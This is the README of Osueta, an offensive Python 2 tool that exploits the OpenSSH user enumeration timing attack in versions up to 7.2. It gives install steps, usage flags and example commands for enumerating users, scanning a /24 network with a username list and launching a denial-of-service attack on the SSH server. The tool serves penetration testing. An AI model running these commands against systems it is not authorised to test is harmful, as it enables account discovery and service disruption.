        ***************************************************************************
        *                  ___                 ___ ___ _  _                       *
        *                 / _ \ _ __  ___ _ _ / __/ __| || |                      *
        *                | (_) | '_ \/ -_) ' \\__ \__ \ __ |                      *
        *                 \___/| .__/\___|_||_|___/___/_||_|                      *
        *                      |_|                                                *
        *   _   _               ___                             _   _             *
        *  | | | |___ ___ _ _  | __|_ _ _  _ _ __  ___ _ _ __ _| |_(_)___ _ _     *
        *  | |_| (_-</ -_) '_| | _|| ' \ || | '  \/ -_) '_/ _` |  _| / _ \ ' \    *
        *   \___//__/\___|_|   |___|_||_\_,_|_|_|_\___|_| \__,_|\__|_\___/_||_|   *
        *                                                                         *
        *          _____ _       _               _  _   _           _             *
        *         |_   _(_)_ __ (_)_ _  __ _    /_\| |_| |_ __ _ __| |__          *
        *           | | | | '  \| | ' \/ _` |  / _ \  _|  _/ _` / _| / /          *
        *           |_| |_|_|_|_|_|_||_\__, | /_/ \_\__|\__\__,_\__|_\_\          *
        *                              |___/                                      *
        ***************************************************************************


What's OSUETA?
==============

        Osueta it's a simple Python2 script to exploit the OpenSSH User Enumeration Timing Attack, 
        present in OpenSSH versions <= 7.2 and >= 5.* . The script has the ability to make variations
        of the username employed in the bruteforce attack, and the possibility to establish
        a DOS condition in the OpenSSH server. 
	
        http://seclists.org/fulldisclosure/2013/Jul/88 
        
    	The bug was corrected in OpenSSH version 7.3:
    	http://www.openssh.com/txt/release-7.3

Authors:
========

        c0r3dump3d | coredump<@>autistici.org
        rofen | rofen<@>gmx.de

	We want to give the thanks to Javier Nieto from www.behindthefirewalls.com for his support and help.

Advice:
=======

	Like others offensive tools, the authors disclaims all responsibility in the use of this script.

Dependencies:
=============

Debian:

        # apt-get install python-ipy python-nmap 
        # pip install paramiko
	# pip install IPy

ArchLinux:

	# pacman -S python2-ipy python2-nmap python2-paramiko

Installing:
===========

        $ git clone https://github.com/c0r3dump3d/osueta.git 

Usage:
======
	usage: osueta.py [-h] [-H HOST] [-k HFILE] [-f FQDN] [-p PORT] [-L UFILE]
                 [-U USER] [-d DELAY] [-v VARI] [-o OUTP] [-l LENGTH]
                 [-c VERS] [--dos DOS] [-t THREADS]

	OpenSSH User Enumeration Time-Based Attack Python script

	optional arguments:
  	-h, --help  show this help message and exit
  	-H HOST     Host Ip or CIDR netblock.
  	-k HFILE    Host list in a file.
  	-f FQDN     FQDN to attack.
  	-p PORT     Host port.
  	-L UFILE    Username list file.
  	-U USER     Only use a single username.
	-d DELAY    Time delay fixed in seconds. If not, delay time is calculated.
  	-v VARI     Make variations of the username (default yes).
  	-o OUTP     Output file with positive results.
	-l LENGTH   Length of the password in characters (x1000) (default 40).
  	-c VERS     Check or not the OpenSSH version (default yes).
  	--dos DOS   Try to make a DOS attack (default no).
  	-t THREADS  Threads for the DOS attack (default 5).


Example:
========

	* A single user enumeration attempt with username variations:

	        ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes

	* A single user enumeration attempt with no user variations a dos attack:

	        ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v no --dos yes

	* Scanning a C class network with only one user:
	
		./osueta -H 192.168.1.0/24 -p 22 -U root -v no 

	* Scanning a C class network with usernames from a file, delay time 15 seconds and a password of 50000 characters:

		./osueta -H 192.168.1.0/24 -p 22 -L usernames.txt -v yes -d 15 -l 50 

